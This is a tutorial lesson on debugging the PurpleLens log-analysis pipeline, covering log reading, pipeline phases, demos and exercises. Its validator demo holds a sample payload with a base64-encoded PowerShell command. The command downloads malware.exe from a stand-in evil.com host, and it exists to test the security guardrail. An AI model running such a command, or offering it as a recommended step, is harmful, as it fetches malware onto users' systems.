# Lesson 15: Debugging Project Lab (PurpleLens)

This lesson is a hands-on debugging workshop that uses your PurpleLens project as the demo environment. You will practice a repeatable debugging workflow, learn where to look for signals, and verify fixes using the same tools the pipeline uses in production.

Prerequisites: Lesson 09 (Debugging Bootcamp) or equivalent comfort with tracebacks and basic logging.

---

## Code Modification Note

Some exercises intentionally break things. Use a practice branch so you can reset easily.

```powershell
# If you do not have a practice branch yet
git checkout -b lessons-practice

# If you already have one
git checkout lessons-practice
```

---

## Learning Goals

By the end of this lesson, you will be able to:
- Reproduce and isolate failures in the PurpleLens pipeline
- Use console logs, run logs, and targeted inspection to find root causes
- Debug the specific phases: ingest, analyze, validate, report, store
- Explain your debugging workflow clearly in an interview

---

## Debugging Workflow (Project-Specific)

Use this exact loop every time:
1) Reproduce the issue with the smallest input possible
2) Identify the phase that failed (ingest, analyze, validate, report, storage)
3) Inspect logs and code paths for that phase
4) Form a hypothesis and test it
5) Fix, then re-run the same input to verify

---

## How to Read Debug Logs (Practical)

Use this checklist when you open a `logs/run_*.log` file:
- Start at the end: find the last `ERROR` line and read upward.
- Identify the phase: the logger name shows the phase (`src.ingest`, `src.llm_analyze`, `src.security`, `src.report`, `src.storage`).
- Find the first warning: earlier `WARNING` lines often explain why the error happened.
- Correlate by timestamps: use time order to connect the failure to earlier context.
- Confirm scope: note the input path, provider, model, and run ID near the top.

Example (read bottom to top):
```
2026-01-08 11:30:31 [INFO] [__main__] Analysis complete with status=success
2026-01-08 11:30:31 [ERROR] [__main__] Failed to persist analysis: database is locked
2026-01-08 11:30:31 [DEBUG] [src.storage] Storage: Opening database connection to db/analysis.db
```

Interpretation:
- The failure is in Phase 5 (storage).
- The first error is the database lock.
- The line right before shows which file/path was used.

---

## Pipeline Map: Where to Look First

Phase 1: Ingest
- Code: [src/ingest.py](../src/ingest.py), [src/ingest_aws.py](../src/ingest_aws.py), [src/ingest_gcp.py](../src/ingest_gcp.py)
- Logs: "Ingested event" debug lines and "Loaded X events" info lines

Phase 2: LLM Analysis
- Code: [src/llm_analyze.py](../src/llm_analyze.py)
- Logs: "LLM: Starting request", "LLM: Parse successful"

Phase 3: Validation
- Code: [src/security.py](../src/security.py), [src/schemas.py](../src/schemas.py)
- Logs: "Security validation" debug lines or schema validation errors

Phase 4: Report
- Code: [src/report.py](../src/report.py)
- Output: report text in `reports/`

Phase 5: Storage
- Code: [src/storage.py](../src/storage.py)
- Logs: "Storage: Saving analysis" and insert messages

---

## Demo 1: Logging Levels (Console vs File)

Goal: learn how `--verbose` and `--debug` change log visibility.

Run with verbose (info-level console, info-level file):

```powershell
python -m src.main --input data\evtx_sample --provider gemini --model gemini-flash-latest --verbose
```

Then run with debug (debug-level console and file):

```powershell
python -m src.main --input data\evtx_sample --provider gemini --model gemini-flash-latest --debug
```

What to notice:
- Console output changes from INFO to DEBUG with `--debug`.
- File logs always capture INFO and above, but only include DEBUG when `--debug` is set.
- The run prints the log path at the end. Open that file in `logs/` to inspect.

Why this matters:
- You control sensitivity and verbosity with flags without changing code.
- Debug logs include sensitive metadata (lengths, hashes), so they are opt-in.

---

## Demo 2: Trace a Validation Failure (Safe, No LLM)

Goal: trigger a security validation failure with a local snippet.

Create `tools/debug_validate_output.py`:

```python
import json
from src.security import validate_output

bad_payload = {
    "status": "success",
    "findings": [],
    "hypotheses": [],
    "indicators_of_compromise": [],
    "recommended_next_steps": [
        "Run powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGU="
    ],
    "confidence": 0.5
}

raw = json.dumps(bad_payload, ensure_ascii=False)
valid, error = validate_output(raw)
print(f"valid={valid} error={error}")
```

Run it:

```powershell
python tools\debug_validate_output.py
```

Expected:
- `valid=False` and a prohibited pattern error.

Why this matters:
- You can validate the security guardrails without calling the LLM.
- This isolates Phase 3 issues from the rest of the pipeline.

---

## Demo 3: Report Timestamp (Standalone Evidence)

Goal: verify report headers include a UTC timestamp and filenames include run_id.

```powershell
python -m src.main --input data\evtx_sample --provider gemini --model gemini-flash-latest --output file --verbose
```

Check the report file in `reports/`:

```powershell
Get-ChildItem reports | Sort-Object LastWriteTime -Descending | Select-Object -First 1
```

Open the report header:

```powershell
Get-Content reports\analysis_<run_id>.txt -TotalCount 6
```

Expected:
- Filename includes run_id.
- Header includes `Report Timestamp (UTC): ...`.

Why this matters:
- The report stays self-documenting when moved or copied.

---

## Demo 4: LLM Response Metadata (Length + Hash)

Goal: know how to correlate LLM responses without logging content.

Run with `--debug` and look for the line:

```
LLM: Parsing JSON response | length=... | hash=sha256:...
```

Why this matters:
- You can track repeat responses or tampering signals without storing content.
- This is safer for sensitive data.

---

## Hands-On Exercises

1) Ingest failure (missing input)
- Run: `python -m src.main --input data\does_not_exist --dry-run`
- Identify the error and the responsible file.

2) Empty JSONL directory
- Create an empty folder and run against it.
- Confirm the `ValueError` and locate the code that raised it.

3) Force report generation without LLM
- Use `--dry-run` to confirm input validity.
- Then run with `--output file` and inspect the report header.

4) Storage debugging
- Open `db/analysis.db` in a SQLite tool.
- Verify a new run entry after a successful analysis.

---

## Interview Story Template (Use This Verbatim)

Situation:
- "During a run, the pipeline failed after ingest, before report generation."

Task:
- "Isolate the failure to a specific phase and recover without changing core logic."

Action:
- "I re-ran with a minimal input and enabled `--debug` to capture file logs. The run log showed the failure in `src/llm_analyze.py` during JSON parsing. I confirmed the LLM response length and hash, and then re-ran with a compatible model to fix the response format issue."

Result:
- "The pipeline completed successfully, and I documented the model compatibility requirement."

---

## Key Takeaways

- Debugging is a loop: reproduce, isolate, test, fix, verify.
- Use project logs first, then code inspection.
- Keep sensitive data out of logs; rely on metadata (lengths, hashes).
- Always re-run the same input to confirm the fix.

---

## Next Steps

Continue with:
- Lesson 10: Database Deep Dive
- Lesson 11: Interview Q and A Practice
